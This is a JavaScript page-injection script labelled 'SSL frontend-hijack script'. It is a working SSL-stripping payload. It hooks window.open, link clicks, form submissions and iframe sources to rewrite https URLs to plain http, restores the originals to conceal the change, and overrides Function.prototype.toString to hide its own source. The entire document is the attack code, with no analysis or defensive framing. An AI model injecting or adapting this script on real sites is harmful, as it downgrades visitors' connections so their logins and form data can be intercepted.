<script>
/**
 * SSL frontend-hijack script
 *   @version 0.1.0
 *   @update 2014/10/26
 */
(function() {

	// for IE6,7,8
	var DOM_3 = !!window.addEventListener;
	var $bind =  DOM_3?
		function(target, event, callback) { target.addEventListener(event, callback) } :
		function(target, event, callback) { target.attachEvent('on' + event, callback) } ;


	function $operator(fn, thiz, $) {
		// standard
		if ('apply' in fn) {
			return fn.apply(thiz, $);
		}
		// old-ie (functor)
		switch ($.length) {
			case 0 : return fn();
			case 1 : return fn($[0]);
			case 2 : return fn($[0], $[1]);
			case 3 : return fn($[0], $[1], $[2]);
			default: return fn($[0], $[1], $[2], $[3]);
		}
	}


	var R_HTTPS = /^https:/i;
	var FAKE_SYMBOL = 'zh_cn';

	function isHttpsUrl(url) {
		return url && R_HTTPS.test(url);
	}

	function downgradeUrl(url) {
		// change protocol, and make a mark
		return url.replace(R_HTTPS, 'http:') +
					(/\?/.test(url) ? '&' : '?') + FAKE_SYMBOL;
	}

	//
	// Hook System
	//
	var _hasOwnProperty = Object.prototype.hasOwnProperty;  // for old-IE

	function hook(ns, key, factory) {
		if (!_hasOwnProperty.call(ns, key)) {
			return false;
		}
		var oldFn = ns[key];
		var newFn = factory(oldFn);
		newFn._str_ = oldFn + '';
		ns[key] = newFn;
		return true;
	}

	// hidden source code
	function toString_factory(oldFn) {
		return function() {
			return this._str_ || oldFn.apply(this, arguments);
		};
	}
	hook(Function.prototype, 'toString', toString_factory);
	hook(Function.prototype, 'toSource', toString_factory);

	//
	// hook window.open('https://...')
	//
	function winopen_factory(oldFn) {
		return function(url) {
			if (isHttpsUrl(url)) {
				arguments[0] = downgradeUrl(url);
			}
			return $operator(oldFn, this, arguments);
		};
	}

	if (window.Window) {
		hook(Window.prototype, 'open', winopen_factory);		
	}
	hook(window, 'open', winopen_factory);


	//
	// Event Hook
	//
	function cheat(el, urlProp) {
		var url = el[urlProp];
		el[urlProp] = downgradeUrl(url);

		// restore later
		setTimeout(function() {
			el[urlProp] = url;
		}, 0);
	}

	// hook <a href="https://...">
	$bind(document, 'click', function(e) {
		e = e || event;
		var el = e.target || e.srcElement;
		do {
			if (el.tagName == 'A') {
				if (el.protocol == 'https:') {
					cheat(el, 'href');
				}
				break;
			}
		} while(el = el.parentNode);
	});

	// hook <form action="https://...">
	if (DOM_3) {
		$bind(document, 'submit', submitHandler);
	}
	else {
		setInterval(function() {
			var forms = document.getElementsByTagName('form');

			for(var i = forms.length - 1; i >= 0; i--) {
				var form = forms[i];
				if (!form._hooked_) {
					form._hooked_ = true;
					$bind(form, 'submit', submitHandler);
				}
			}
		}, 500);
	}

	function submitHandler(e) {
		e = e || event;
		var el = e.target || e.srcElement;

		if (isHttpsUrl(el.action)) {
			cheat(el, 'action');
		}
	}


	//
	// monitor <iframe src="https://...">
	//
	function scanNode(el) {
		try {
			if (el.tagName == 'IFRAME') {
				if (isHttpsUrl(el.src)) {
					el.src = downgradeUrl(el.src);
				}
			}
		} catch(e)
		{}
	}

	function scanNodes(nodes) {
		for (var i = 0, n = nodes.length; i < n; i++) {
			scanNode(nodes[i]);
		}
	}

	if (window.MutationObserver) {
		var observer = new MutationObserver(function(records) {
			for (var i = 0, n = records.length; i < n; i++) {
				scanNodes(records[i].addedNodes);
			}
		});
		observer.observe(document, {
			subtree: true,
			childList: true
		});
	}

	setInterval(function() {
		scanNodes(window.frames);
	}, 300);
})();
</script>